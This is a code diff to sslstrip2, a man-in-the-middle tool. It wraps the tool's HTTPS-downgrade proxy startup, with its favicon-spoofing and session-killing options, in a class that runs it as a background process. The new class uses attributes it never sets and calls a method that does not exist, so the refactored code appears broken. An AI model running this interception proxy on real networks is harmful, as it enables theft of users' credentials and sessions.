@@ -35,6 +35,61 @@ import sys, getopt, logging, traceback, string, os
 
 gVersion = "0.9 +"
 
+class Sslstrip2(object):
+
+    def __init__(self,
+                 log_file,
+                 listen_port,
+                 spoof_favicon,
+                 kill_sessions,
+                 log_level=logging.WARNING):
+
+        self.log_file = log_file
+        self.listen_port = listen_port
+        self.spoof_favicon = spoof_favicon
+        self.kill_sessions = kill_sessions
+        self.log_level = log_level
+
+    @staticmethod
+    def _start(logFile,
+                listenPort,
+                spoofFavicon,
+                killSessions,
+                logLevel=logging.WARNING):
+    
+        logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
+                            filename=logFile, filemode='w')
+    
+        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
+        CookieCleaner.getInstance().setEnabled(killSessions)
+    
+        strippingFactory              = http.HTTPFactory(timeout=10)
+        strippingFactory.protocol     = StrippingProxy
+    
+        reactor.listenTCP(int(listenPort), strippingFactory)
+                    
+        print "\nsslstrip " + gVersion + " by Moxie Marlinspike running..."
+        print "+ POC by Leonardo Nve"
+    
+        reactor.run()
+
+    def start(self):
+
+        self.proc = Process(target=self._start, args=(
+                                            self.log_file,
+                                            self.port,
+                                            self.fav,
+                                            self.kill_sessions,
+                                            self.log_level,))
+
+        self.proc.daemon = True
+        self.proc.start()
+
+    def stop(self):
+
+        self.proc.terminate()
+        self.proc.stop()
+
 def usage():
     print "\nsslstrip " + gVersion + " by Moxie Marlinspike"
     print "Version + by Leonardo Nve"
@@ -87,28 +142,8 @@ def parseOptions(argv):
         usage()                          
         sys.exit(2)                         
 
-def sslstrip2(logFile,
-            listenPort,
-            spoofFavicon,
-            killSessions,
-            logLevel=logging.WARNING):
-
-    logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
-                        filename=logFile, filemode='w')
-
-    URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
-    CookieCleaner.getInstance().setEnabled(killSessions)
-
-    strippingFactory              = http.HTTPFactory(timeout=10)
-    strippingFactory.protocol     = StrippingProxy
-
-    reactor.listenTCP(int(listenPort), strippingFactory)
-                
-    print "\nsslstrip " + gVersion + " by Moxie Marlinspike running..."
-    print "+ POC by Leonardo Nve"
-
-    reactor.run()
         
+
 def main(argv):
     (logFile, logLevel, listenPort, spoofFavicon, killSessions) = parseOptions(argv)
 
